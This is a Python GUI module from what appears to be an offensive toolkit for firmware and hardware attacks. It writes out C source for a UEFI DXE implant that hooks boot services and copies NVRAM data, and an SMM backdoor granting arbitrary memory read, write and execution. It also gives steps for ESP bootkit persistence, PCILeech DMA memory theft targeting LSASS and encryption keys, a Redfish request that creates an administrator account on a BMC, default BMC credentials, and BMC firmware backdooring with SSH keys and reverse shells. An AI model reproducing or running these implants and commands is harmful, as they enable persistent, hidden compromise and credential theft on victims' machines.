# language: Python, file: modules/firmware.py
# firmware attacks — UEFI DXE implants, SMM backdoors, SPI dump/flash, DMA
import customtkinter as ctk
import threading
import subprocess
import os
import struct
import time
from utils.progress import ProgressTracker


class FirmwareModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "firmware"
        self.progress = ProgressTracker(log_queue)

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="FIRMWARE / HARDWARE",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="UEFI implants · SPI dump/flash · SMM backdoor · DMA · BMC",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 12), padx=24, anchor="w")

        # ---- config ----
        cfg = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        cfg.pack(fill="x", padx=24)

        r1 = ctk.CTkFrame(cfg, fg_color="transparent")
        r1.pack(fill="x", padx=12, pady=8)
        self.spi_dev = ctk.CTkEntry(r1, placeholder_text="SPI device (/dev/mtd0, /dev/spidev0.0)",
                                    width=260, height=32,
                                    fg_color="#05080c", border_color="#1a2332")
        self.spi_dev.pack(side="left", padx=(0, 6))
        self.fw_dump = ctk.CTkEntry(r1, placeholder_text="dump path (/tmp/fw.bin)",
                                    width=220, height=32,
                                    fg_color="#05080c", border_color="#1a2332")
        self.fw_dump.insert(0, "/tmp/fw.bin")
        self.fw_dump.pack(side="left", padx=(0, 6))
        self.chip = ctk.CTkEntry(r1, placeholder_text="chip (W25Q128, MX25L...)",
                                 width=180, height=32,
                                 fg_color="#05080c", border_color="#1a2332")
        self.chip.pack(side="left")

        r2 = ctk.CTkFrame(cfg, fg_color="transparent")
        r2.pack(fill="x", padx=12, pady=(0, 10))
        self.pcileech_e = ctk.CTkEntry(r2, placeholder_text="PCILeech FPGA (screamer/leech)",
                                       width=260, height=32,
                                       fg_color="#05080c", border_color="#1a2332")
        self.pcileech_e.pack(side="left", padx=(0, 6))
        self.target_mem = ctk.CTkEntry(r2, placeholder_text="target memory range (0x0-0xffffffff)",
                                       width=280, height=32,
                                       fg_color="#05080c", border_color="#1a2332")
        self.target_mem.pack(side="left")

        # ---- actions ----
        ctk.CTkLabel(parent, text="Operations:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")

        grid = ctk.CTkFrame(parent, fg_color="transparent")
        grid.pack(fill="x", padx=24)

        actions = [
            ("⌖ Detect platform", self._detect),
            ("⌖ Dump SPI flash", self._dump_spi),
            ("⌖ Read UEFI vars", self._read_vars),
            ("⌖ Analyze firmware", self._analyze),
            ("☣ Build DXE implant", self._build_dxe),
            ("☣ Inject DXE implant", self._inject_dxe),
            ("☣ SMM backdoor", self._build_smm),
            ("☣ Flash modified FW", self._flash),
            ("☣ Bootkit persist", self._bootkit_persist),
            ("☢ DMA dump RAM", self._dma_dump),
            ("☢ PCILeech exec", self._pcileech_exec),
            ("☢ DMA implant", self._dma_implant),
            ("☢ Thunderclap probe", self._thunderclap),
            ("☢ BMC enumerate", self._bmc_enum),
            ("☢ BMC RCE (IPMI)", self._bmc_ipmi),
            ("☢ BMC firmware backdoor", self._bmc_backdoor),
        ]
        for i, (label, fn) in enumerate(actions):
            ctk.CTkButton(
                grid, text=label, width=220, height=34,
                fg_color="#141a22", hover_color="#1a2332",
                font=ctk.CTkFont(size=11), command=fn
            ).grid(row=i // 4, column=i % 4, padx=4, pady=4)

        # ---- progress ----
        self.bars = ctk.CTkFrame(parent, fg_color="#0d1319", corner_radius=6)
        self.bars.pack(fill="x", padx=24, pady=(12, 0))

        # ---- output ----
        ctk.CTkLabel(parent, text="Output:",
                     font=ctk.CTkFont(size=12, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(12, 4), padx=24, anchor="w")
        self.out = ctk.CTkTextbox(
            parent, fg_color="#05080c", text_color="#7dffb0",
            font=ctk.CTkFont(family="Consolas", size=10), height=260
        )
        self.out.pack(fill="both", expand=True, padx=24, pady=(0, 12))

        self._poll_bars()

    def _poll_bars(self):
        for w in self.bars.winfo_children():
            w.destroy()
        for tid, t in list(self.progress.snapshot().items())[:5]:
            row = ctk.CTkFrame(self.bars, fg_color="transparent")
            row.pack(fill="x", padx=8, pady=2)
            ctk.CTkLabel(row, text=t["label"][:45], width=300, anchor="w",
                         font=ctk.CTkFont(size=10),
                         text_color="#c8d6e5").pack(side="left")
            b = ctk.CTkProgressBar(row, width=200, height=10,
                                   progress_color="#00ff9c")
            if t["total"]:
                b.set(min(t["current"]/t["total"], 1.0))
            else:
                b.set(0.5 if t["status"] == "running" else 1.0)
            b.pack(side="left", padx=(0, 8))
            ctk.CTkLabel(row, text=t.get("detail", "")[:60],
                         font=ctk.CTkFont(size=9),
                         text_color="#4a5568").pack(side="left")
        self.bars.after(500, self._poll_bars)

    def _out(self, text):
        self.out.insert("end", text + "\n")
        self.out.see("end")

    def _run(self, cmd, tag="fw"):
        try:
            p = subprocess.Popen(cmd, shell=isinstance(cmd, str),
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in p.stdout:
                self._out(line.rstrip())
                self.log.put(f"[{tag}] {line.rstrip()}")
            p.wait()
        except FileNotFoundError as e:
            self.log.put(f"[fw] missing: {e.filename}")

    # ==================== platform ====================
    def _detect(self):
        self._out("=== Platform detection ===\n")
        cmds = [
            "cat /sys/class/dmi/id/product_name 2>/dev/null",
            "cat /sys/class/dmi/id/bios_version 2>/dev/null",
            "cat /sys/class/dmi/id/board_name 2>/dev/null",
            "[ -d /sys/firmware/efi ] && echo 'UEFI boot' || echo 'Legacy BIOS'",
            "[ -d /sys/firmware/efi/efivars ] && echo 'efivars accessible'",
            "ls /dev/mtd* 2>/dev/null",
            "ls /dev/spidev* 2>/dev/null",
            "lsusb | grep -iE 'fpga|ftdi|jtag|bus pirate|greatfet|facedancer'",
            "lspci | grep -iE 'ethernet|thunderbolt|usb4|pcie'",
            "dmidecode -t bios 2>/dev/null | head -20",
        ]
        for c in cmds:
            self._out(f"$ {c}")
            threading.Thread(target=self._run, args=(c,), daemon=True).start()

    def _read_vars(self):
        self._out("=== UEFI variables ===\n")
        cmds = [
            "efivar -l 2>/dev/null | head -100",
            "ls /sys/firmware/efi/efivars/ 2>/dev/null | head -50",
            "cat /sys/firmware/efi/efivars/SecureBoot-* 2>/dev/null | xxd",
            "ls /sys/firmware/acpi/tables/ 2>/dev/null",
        ]
        for c in cmds:
            self._out(f"\n$ {c}")
            threading.Thread(target=self._run, args=(c,), daemon=True).start()

    # ==================== SPI dump ====================
    def _dump_spi(self):
        dev = self.spi_dev.get().strip()
        out = self.fw_dump.get().strip()
        if not dev:
            self.log.put("[fw] SPI device required")
            return

        tid = f"dump-{int(time.time())}"
        self.progress.start(tid, f"Dump SPI {dev}", total=100)

        def run():
            try:
                # method 1: direct dd from mtd
                cmd = f"dd if={dev} of={out} bs=1M status=progress"
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True, bufsize=1)
                for line in p.stdout:
                    self._out(line.rstrip())
                    self.progress.update(tid, increment=1)
                p.wait()
                size = os.path.getsize(out) if os.path.exists(out) else 0
                self._out(f"[+] dumped {size} bytes → {out}")
                self.progress.finish(tid, detail=f"{size} bytes")

                # verify
                self._out(f"\n[*] verify with flashrom:")
                self._out(f"    flashrom -p internal:laptop=force_I_want_a_brick -r {out}.verify")
            except Exception as e:
                self.log.put(f"[fw] dump err: {e}")
                self.progress.finish(tid, "failed", str(e))

        threading.Thread(target=run, daemon=True).start()

    def _flash(self):
        out = self.fw_dump.get().strip()
        if not os.path.exists(out):
            self.log.put(f"[fw] dump file not found: {out}")
            return
        self._out(f"""
=== Flash modified firmware ===

# internal (host, brick risk):
flashrom -p internal:laptop=force_I_want_a_brick -w {out}

# external (CH341A, safer):
flashrom -p ch341a_spi -w {out}

# with chip:
flashrom -p ch341a_spi -c {self.chip.get() or 'W25Q128.V'} -w {out}

WARNING: bad flash = brick. Verify dump matches before flashing.
""")

    # ==================== analyze ====================
    def _analyze(self):
        fw = self.fw_dump.get().strip()
        if not os.path.exists(fw):
            return
        tid = f"an-{int(time.time())}"
        self.progress.start(tid, "Firmware analysis")

        def run():
            # UEFITool for structure
            self._out(f"\n=== UEFITool structure ===")
            try:
                subprocess.run(["UEFIExtract", fw, "-o", "/tmp/fw_extract/"],
                               timeout=300)
            except FileNotFoundError:
                self._out("UEFITool not installed — apt install uefitool")

            # binwalk
            self._out(f"\n=== binwalk scan ===")
            try:
                p = subprocess.Popen(["binwalk", fw],
                                     stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True)
                for line in p.stdout:
                    self._out(line.rstrip())
                p.wait()
            except FileNotFoundError:
                self._out("binwalk not installed — apt install binwalk")

            # search for secure boot vars
            self._out(f"\n=== strings for identifiers ===")
            for kw in ["SecureBoot", "PK", "KEK", "db", "dbx", "Setup",
                       "AMITSE", "DxeCore", "PeiCore"]:
                self._out(f"grep {kw} → {fw}.{kw}.txt")
                subprocess.run(
                    f"strings {fw} | grep -i {kw} > {fw}.{kw}.txt",
                    shell=True)
            self.progress.finish(tid, detail="analysis complete")

        threading.Thread(target=run, daemon=True).start()

    # ==================== DXE implant ====================
    def _build_dxe(self):
        self._out("""
=== DXE Implant — persistent ring -2 backdoor ===

Concepts:
  DXE drivers load before OS, can hook any boot service
  Common hooks: ExitBootServices, SetVirtualAddressMap, GetVariable, SetVariable
  Persist via: patched DXE volume in SPI flash

Template (dxe_implant.c — build with EDK2):
""")
        dxe = r'''// dxe_implant.c — Al-Baron UEFI DXE backdoor
// build: EDK2 — add to a DSC/INF, compile as DXE_DRIVER
#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/BaseMemoryLib.h>
#include <Protocol/LoadedImage.h>

#define SHDW_SIG 0x53484457  // "SHDW"
#define NVRAM_VAR L"ShadowCfg"

EFI_STATUS EFIAPI ShadowExitBootServices(
    IN EFI_HANDLE ImageHandle,
    IN UINTN MapKey
) {
    // restore original before chain
    EFI_STATUS s = gBS->ExitBootServices(ImageHandle, MapKey);

    // at this point no boot services — we are pre-kernel
    // patch kernel entry, drop shellcode in memory, or DMA target
    // [payload slot]

    return s;
}

EFI_STATUS EFIAPI ShadowSetVariable(
    IN CHAR16 *VariableName,
    IN EFI_GUID *VendorGuid,
    IN UINT32 Attributes,
    IN UINTN DataSize,
    IN VOID *Data
) {
    // backdoor: steal creds written to NVRAM
    // if VariableName == L"Setup" or similar, log to hidden NVRAM
    if (VariableName && DataSize > 0) {
        // write data to hidden var
        EFI_STATUS s = gRT->SetVariable(
            NVRAM_VAR, VendorGuid,
            EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            DataSize, Data);
    }
    return gRT->SetVariable(VariableName, VendorGuid, Attributes,
                             DataSize, Data);
}

EFI_STATUS EFIAPI UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
) {
    // hook ExitBootServices
    gBS->ExitBootServices = (EFI_EXIT_BOOT_SERVICES)ShadowExitBootServices;

    // hook SetVariable
    gRT->SetVariable = (EFI_SET_VARIABLE)ShadowSetVariable;

    DEBUG((EFI_D_INFO, "[SHDW] DXE implant loaded\n"));

    // install protocol to keep handle alive
    EFI_HANDLE h = NULL;
    return gBS->InstallProtocolInterface(
        &h, &gEfiLoadedImageProtocolGuid,
        EFI_NATIVE_INTERFACE, ImageHandle);
}
'''
        os.makedirs("payloads/uefi", exist_ok=True)
        with open("payloads/uefi/dxe_implant.c", "w") as f:
            f.write(dxe)
        self._out("\n[+] written: payloads/uefi/dxe_implant.c")
        self._out("""
Build steps:
  1. clone EDK2: git clone https://github.com/tianocore/edk2
  2. source edksetup.sh && build -p OvmfPkg/OvmfPkgX64.dsc -a X64
  3. copy .efi to USB / EFI/BOOT/BOOTX64.EFI to test
  4. inject into DXE volume with UEFITool + reflash
""")

    def _inject_dxe(self):
        self._out("""
=== Inject DXE implant into SPI dump ===

1. Extract DXE volume:
   UEFIExtract fw.bin
   → fw.bin.dump/.../DXE dependency sections

2. Find a rarely-used DXE driver (Setup, AMITSE, or a language module)

3. Replace with our implant:
   UEFIReplace -s <volume_guid> -f <file_guid> implant.efi fw.bin
   (or use UEFITool GUI — "Replace as is")

4. Fix checksums:
   UEFITool → "Rebuild" the volume

5. Reflash — ENABLE SPI write protection first via runtime
   Then verify with: chipsec_main -m common.bios_wp
""")

    # ==================== SMM ====================
    def _build_smm(self):
        self._out("""
=== SMM Backdoor — ring -2 privileged, invisible to OS ===

SMM runs in System Management RAM — OS cannot see or disable.
Trigger: write to specific port or SMI via ACPI.

To place SMM implant you need:
  1. SMM vulnerability to write SMRAM (exploit)
  2. Or: SPI flash modified to include malicious SMM driver (if signed impossible)
  3. Or: commercial implant (e.g. LoJax-lite approach)

Basic SMI handler template (smm_backdoor.c — EDK2):
""")
        smm = r'''// smm_backdoor.c — SMI handler with backdoor
#include <Uefi.h>
#include <Library/SmmServicesTableLib.h>
#include <Library/SmmMemLib.h>
#include <Protocol/SmmSwDispatch2.h>

#define SHDW_SMI 0x9A          // custom SMI value — host writes to port
#define CMD_NONE       0
#define CMD_READ_PHYS  1
#define CMD_WRITE_PHYS 2
#define CMD_EXEC       3

typedef struct {
    UINT64 cmd;
    UINT64 addr;
    UINT64 size;
    UINT64 buf;   // phys addr of data buffer
} SHDW_CMD;

EFI_STATUS EFIAPI SwSmiHandler(
    IN EFI_HANDLE DispatchHandle,
    IN CONST VOID *Context,
    IN OUT VOID *CommBuffer,
    IN OUT UINTN *CommBufferSize
) {
    SHDW_CMD *c = (SHDW_CMD *)CommBuffer;
    if (!c) return EFI_SUCCESS;

    switch (c->cmd) {
        case CMD_READ_PHYS:
            // read any physical memory — SmmMemLib bypasses MMU
            CopyMem((VOID*)c->buf, (VOID*)c->addr, (UINTN)c->size);
            break;
        case CMD_WRITE_PHYS:
            // write anywhere — patch kernel, inject into process
            CopyMem((VOID*)c->addr, (VOID*)c->buf, (UINTN)c->size);
            break;
        case CMD_EXEC:
            // call arbitrary function pointer
            ((void(*)())c->addr)();
            break;
    }
    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI SmmMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
) {
    EFI_SMM_SW_DISPATCH2_PROTOCOL *sw;
    EFI_SMM_SW_REGISTER_CONTEXT ctx;
    EFI_HANDLE h;

    gSmst->SmmLocateProtocol(&gEfiSmmSwDispatch2ProtocolGuid,
                              NULL, (VOID**)&sw);
    ctx.SwSmiInputValue = SHDW_SMI;
    sw->Register(sw, SwSmiHandler, &ctx, &h);

    return EFI_SUCCESS;
}
'''
        with open("payloads/uefi/smm_backdoor.c", "w") as f:
            f.write(smm)
        self._out("\n[+] written: payloads/uefi/smm_backdoor.c")
        self._out("""
Host side — trigger SMI from userland Linux:
    outb(0x9A, cmd)      # requires iopl(3) or kernel module
    outb(0x9A+1, addr&0xff) ...

SMM placement: SPI flash has SMM volume — UEFITool can locate
Replace a rarely-used SMM driver with ours, rebuild, reflash.
""")

    def _bootkit_persist(self):
        self._out("""
=== Bootkit persistence (survives OS reinstall) ===

Where in the chain:
  UEFI firmware (SPI) → DXE drivers → Boot Manager → Windows Boot Mgr
                                              → winload.efi
                                              → kernel

Persist options:
  1. DXE implant (SPI) — highest, survives OS reinstall
  2. Malicious EFI System Partition (ESP):
     - replace \\EFI\\Microsoft\\Boot\\bootmgfw.efi with backdoored
     - survives OS reinstall if ESP not wiped
  3. Windows Boot Manager (BCD) — set custom bootmgr path
     bcdedit /set {bootmgr} path \\EFI\\evil\\boot.efi
  4. Legacy: MBR/VBR bootkit (MBR sig check bypass)

ESP implant PoC:
  1. dump bootmgfw.efi
  2. hook ExitBootServices, patch kernel
  3. write back to ESP
  bcdedit /set {bootmgr} path \\EFI\\evil\\boot.efi
""")

    # ==================== DMA ====================
    def _dma_dump(self):
        self._out("""
=== DMA attacks — read/write RAM without OS cooperation ===

Requirements:
  - Thunderbolt/PCIe port with DMA exposed (or ExpressCard)
  - Or: PCILeech FPGA (Screamer, Leech, ZDMA)

Setup PCILeech:
  git clone https://github.com/ufrisk/pcileech
  # flash firmware to FPGA
  # connect to target
  pcileech -device fpga

Read target memory:
  pcileech -device fpga dump -min 0x0 -max 0xffffffff -out /tmp/ram.bin
  pcileech -device fpga display -min 0x0 -max 0x100000

Search for:
  - LSASS process (Windows)
  - /etc/shadow, ssh keys, GPG keys
  - Browser session tokens
  - Full disk encryption keys (BitLocker/LUKS) — even before OS boots
""")

    def _pcileech_exec(self):
        self._out("""
=== PCILeech — execute in target kernel ===

1. Insert FPGA into target PCIe/Thunderbolt
2. Connect to attacker machine via USB3
3. Load driver:
   pcileech -device fpga
4. Inject shellcode:
   pcileech -device fpga.exe /tmp/shellcode.bin
5. Or: run direct commands:
   pcileech -device fpga exec <kernel_addr> "cmd.exe /c ..."
6. Or: use pcileech "write" to modify code
   pcileech -device fpga write -min 0xfffff800XXXXXXXX -in patch.bin

Common payloads:
  - Patch kernel to disable DSE (Driver Signature Enforcement)
  - Patch kernel to allow unsigned drivers
  - Hook syscalls
  - Read LSASS directly
  - Add bootkit to disk (write to MBR/ESP)
""")

    def _dma_implant(self):
        self._out("""
=== DMA persistent implant ===

Once DMA access:
1. Patch bootmgr in memory during boot → inject kernel driver
2. Patch Windows kernel PatchGuard bypass
3. Hook KiSystemCall64 → log all syscalls
4. Inject into winlogon.exe → persistence on every logon
5. Write directly to disk MBR (bypasses disk encryption when unlocked)

Firmware-level DMA implant (Thunderclap):
  - FPGA sits on Thunderbolt, has DMA
  - Takes over PCIe → can MITM all PCIe traffic
  - Even affects network card, disk controller
  - Requires Thunderbolt security to be off (or cold-boot attack to bypass)
""")

    def _thunderclap(self):
        self._out("""
=== Thunderclap (CVE-2019-9730 etc.) ===

Probe target:
  # check Thunderbolt security level
  cat /sys/bus/thunderbolt/devices/0-1/security

  none  = full DMA — victory
  user  = user approval per device
  secure= challenge-response
  dponly= display only

Bypass:
  - Fake PCIe device with same VID/DID as target's
  - Or: DMA re-map attack on IOMMU (if enabled)
  - Or: exploit specific Ethernet NIC driver (e1000e, etc.) to gain kernel
  - Or: pre-boot attack — DMA implant before IOMMU enabled

Tools:
  https://github.com/CyberArk-Labs/Thunderclap-PoC
  https://github.com/ufrisk/pcileech-fpga
""")

    # ==================== BMC ====================
    def _bmc_enum(self):
        self._out("""
=== BMC enumeration ===

BMC = Baseboard Management Controller (IPMI/iDRAC/iLO/AMI MegaRAC)

Discovery:
  nmap -p 623,664,80,443,5900,5901 <target> --script ipmi-version,bmc-info
  ipmitool -I lanplus -H <ip> -U ADMIN -P ADMIN chassis status
  ipmitool -I lanplus -H <ip> -U root -P calvin mc info

Default creds:
  Supermicro: ADMIN / ADMIN, ADMIN / <random>
  iDRAC: root / calvin
  iLO: Administrator / <random on tag>
  AMI MegaRAC: root / superuser, admin / admin
  Lenovo XCC: USERID / PASSW0RD

Web interfaces:
  https://<ip>/            # Redfish
  https://<ip>/redfish/v1/Systems/
  https://<ip>/cgi/login.cgi    # AMI
""")

    def _bmc_ipmi(self):
        self._out("""
=== BMC RCE paths ===

1. IPMI 2.0 RAKP auth bypass (CVE-2013-4786):
   - Get password hash without auth
   - Crack offline
   hashcat -m 7300 hash.txt wordlist.txt

2. AMI MegaRAC (CVE-2023-34329, CVE-2023-34330, CVE-2024-...):
   - Auth bypass in Redfish → create user
   - POST /redfish/v1/AccountService/Accounts with no auth
   curl -k -X POST https://<bmc>/redfish/v1/AccountService/Accounts \\
     -d '{"UserName":"attacker","Password":"pwn","RoleId":"Administrator"}'

3. Supermicro IPMI (CVE-2019-16745 etc.)
   - Password in cleartext in web UI

4. iDRAC (CVE-2018-1207 etc.)
   - Command injection in web

5. Flash BMC firmware → total persistence
   ipmitool -I lanplus -H <ip> -U root -P calvin raw 0x32 0xba ...
""")

    def _bmc_backdoor(self):
        self._out("""
=== BMC firmware backdoor ===

1. Dump BMC firmware:
   - From BMC itself: flashrom -p internal -r bmc.bin
   - Or vendor update file (.bin from support site)

2. Unpack:
   binwalk -Me bmc.bin
   → find Linux rootfs (often JFFS2, squashfs, ubi)

3. Modify:
   - Add SSH key: /etc/dropbear/authorized_keys
   - Add cron: /etc/crontabs/root
   - Replace web login check: /usr/local/www/cgi-bin/login
   - Add reverse shell script

4. Repack & flash:
   flashrom -p internal -w bmc_mod.bin

BMC backdoor advantages:
  - Survives OS reinstall AND disk replacement
  - Out-of-band access — works even when OS is off
  - Often has network access independent of host NIC
  - Rarely monitored by SOC
""")

    # ==================== helpers for integration ====================
    def esp_implant(self, mount_point, backdoor_efi):
        """deploy backdoored bootmgfw to ESP (called from post module)"""
        esp_path = f"{mount_point}/EFI/Microsoft/Boot/bootmgfw.efi"
        backup = f"{esp_path}.orig"
        if os.path.exists(esp_path):
            subprocess.run(["cp", esp_path, backup])
        subprocess.run(["cp", backdoor_efi, esp_path])
        self.log.put(f"[fw] ESP implant: {esp_path}")
